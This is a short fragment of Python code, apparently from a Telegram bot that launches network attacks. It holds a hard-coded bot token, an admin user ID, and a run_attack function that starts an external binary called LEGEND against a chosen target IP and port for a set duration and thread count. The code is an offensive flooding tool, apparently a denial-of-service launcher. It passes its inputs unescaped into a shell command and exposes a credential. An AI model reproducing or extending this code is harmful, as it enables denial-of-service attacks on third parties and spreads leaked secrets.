...
# Configuration
TOKEN = '7855363545:AAFIG3yP6h7ETUqNRBltPu_aDzln0oS0pQw'
ADMIN_USER_ID = 5434228377
...
async def run_attack(target_ip, target_port, duration):
    ...
    try:
        process = await asyncio.create_subprocess_shell(f"./LEGEND {target_ip} {target_port} {duration} 1000")
